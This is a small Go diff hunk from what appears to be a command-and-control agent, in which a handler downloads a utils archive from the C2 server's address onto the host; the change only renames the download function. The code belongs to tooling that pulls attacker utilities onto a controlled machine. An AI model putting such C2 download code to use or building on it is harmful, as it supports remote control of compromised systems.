@@ -41,7 +41,7 @@ func VaccineHandler(download_addr, checksum string) (out string) {
 	}
 
 	logging.Printf("Downloading utils from %s", def.CCAddress+"www/"+UtilsArchive)
-	_, err := c2transport.SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
+	_, err := c2transport.FetchFile(download_addr, UtilsArchive, UtilsArchivePath, checksum)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		logging.Printf("Utils error: %v", err)
